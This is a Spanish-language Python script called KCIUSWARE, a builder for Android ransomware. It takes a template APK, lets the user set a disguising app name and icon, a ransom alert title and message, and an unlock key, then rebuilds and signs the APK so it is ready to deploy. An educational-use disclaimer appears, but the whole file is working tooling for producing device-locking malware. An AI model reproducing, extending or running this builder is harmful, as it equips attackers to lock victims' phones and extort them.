#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image

r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[0m"

app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""

def banner():
    print(w+d+"KCIUSWARE - version 1.0")
    print(w+b+"------------------")
    print(w+b+"Creado por "+y+"@hacking.etico")
    print(w+b+"El autor no es responsable")
    print(w+b+"por problemas o daños")
    print(w+b+"causados por este programa")

def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(r+"[!]"+w+" Error para escribir en archivo "+file)

def start():
    global app_icon, app_name, alert_title, alert_desc, key_pass
    os.system("clear")
    banner()
    print(r+"[!]"+w+" Use esta herramienta solo con fines educativos")
    ask = str(input(r+"[!]"+w+" Estas de acuerdo (s/n): ").lower())
    if ask in ("si"): pass
    else: exit(r+"[!]"+w+" No hagas el mal !")
    print(f"""
    {r}KCIUSWARE{w} es un ataque basico Ransomware para Android
    {w}El usuario puede personalizar el icono de la app, el nombre y la llave.
    {d}Si olvidas la llave de desbloqueo, solo reinicia tu celular !{w}
    """)
    print(b+"> "+w+os.popen("curl ifconfig.co/city --silent").readline().strip()+", "+os.popen("curl ifconfig.co/country --silent").readline().rstrip()+time.strftime(", %d/%m/%Y (%H.%M.%S)"))
    print(b+">"+w+" Use \\n para nueva linea y  CTRL + C para salir")
    print(w+"-"*43)
    while True:
        x = str(input(w+"* Agregue el icono de la app (solo PNG ): "+g))
        if os.path.isfile(x):
            if ".png" in x:
                app_icon = x
                break
            else: print(r+"[!]"+w+" Archivo no aceptado, solo formato PNG !")
        else: print(r+"[!]"+w+" Archivo no encontrado, por favor seleccione correctamente !")
    while True:
        x = str(input(w+"* Cree un nombre para la app: "+g))
        if len(x) != 0:
            app_name = x
            break
        else: continue
    while True:
        x = str(input(w+"* Crear un titulo: "+g))
        if len(x) != 0:
            alert_title = x
            break
        else: continue
    while True:
        x = str(input(w+"* Crear una descripcion: "+g))
        if len(x) != 0:
            alert_desc = x
            break
        else: continue
    while True:
        x = str(input(w+"* Cree una llave de desbloqueo: "+g))
        if len(x) != 0:
            key_pass = x
            break
        else: continue
    print(w+"* Preparando tu APK ransomware ...")
    print(w+"-"*43+d)
    os.system("apktool d kciusware.apk")
    imgpath = [
        "kciusware/res/drawable-mdpi-v4/ic_launcher.png",
        "kciusware/res/drawable-xhdpi-v4/ic_launcher.png",
        "kciusware/res/drawable-hdpi-v4/ic_launcher.png",
        "kciusware/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "kciusware/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L kciusware/ -name '*0000.smali'","r").readline().strip()
    print("I: Using smali "+os.path.basename(smali))
    writefile(strings,"appname",app_name)
    print("I: Adding name with "+app_name)
    writefile(strings,"alert_title",alert_title)
    print("I: Adding title with "+alert_title)
    writefile(strings,"alert_desc",alert_desc)
    print("I: Adding description with "+str(len(alert_desc))+" words")
    writefile(smali,"key_pass",key_pass)
    print("I: Adding unlock key with "+key_pass)
    time.sleep(3)
    for path in imgpath:
        if os.path.isfile(path):
            with Image.open(path) as target:
                width, height = target.size
                size = str(width)+"x"+str(height)
                logo = os.path.basename(app_icon)
                os.system("cp -R "+app_icon+" "+logo)
                os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                os.system("rm -rf "+logo)
                print("I: Adding icon with "+os.path.basename(app_icon)+" size: "+size)
        else: exit(1)
    os.system("apktool b kciusware -o final.apk;rm -rf kciusware")
    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")
    if os.path.isfile("final-aligned-signed.apk"):
        out = app_name.replace(" ","").lower() + ".apk"
        os.system("mv final-aligned-signed.apk "+out)
        getpass(b+">"+w+" Resultado guardado como: "+B+" "+out+" "+w)
    else: print(r+"[!]"+w+" Error para firmar la APK")

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit(r+"\n[!]"+w+" Gracias por usar esta herramienta\n    saliendo ...")
